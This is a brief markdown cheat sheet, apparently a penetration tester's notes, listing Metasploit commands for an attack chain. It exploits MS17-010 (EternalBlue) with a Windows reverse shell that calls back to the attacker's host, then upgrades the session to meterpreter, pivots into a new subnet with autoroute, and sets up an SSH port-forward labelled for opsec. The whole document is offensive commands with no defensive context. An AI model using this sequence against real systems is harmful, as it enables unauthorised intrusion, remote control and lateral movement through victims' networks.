## Initial access

```
use exploit/windows/smb/ms17_010_psexec
set payload windows/shell_reverse_tcp
set LPORT, LHOST, RPORT, RHOST
run
```

## Escalate to the meterpreter session:

```
sessions -l
use post/multi/manage/shell_to_meterpreter
set SESSION 1 
set LPORT 4444
run
sessions -i 2
```

## Pivoting to new subnet

```
use post/multi/manage/autoroute
```
## Opsec ssh jumphost

ssh -N -L 3000:localhost:3000 ubuntu@IPADDR
